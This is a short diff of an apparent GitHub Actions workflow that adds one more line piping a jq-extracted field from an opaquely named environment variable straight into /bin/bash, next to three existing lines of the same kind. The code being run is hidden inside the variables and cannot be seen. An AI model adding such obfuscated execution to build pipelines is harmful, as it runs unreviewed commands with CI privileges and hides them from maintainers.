@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$ak75379" | jq -r .fsdc6105 | /bin/bash
           printf '%s' "$ve05" | jq -r .cmk567 | /bin/bash
           printf '%s' "$kmn4158" | jq -r .h851 | /bin/bash
+          printf '%s' "$ecamn1" | jq -r .xsq58 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
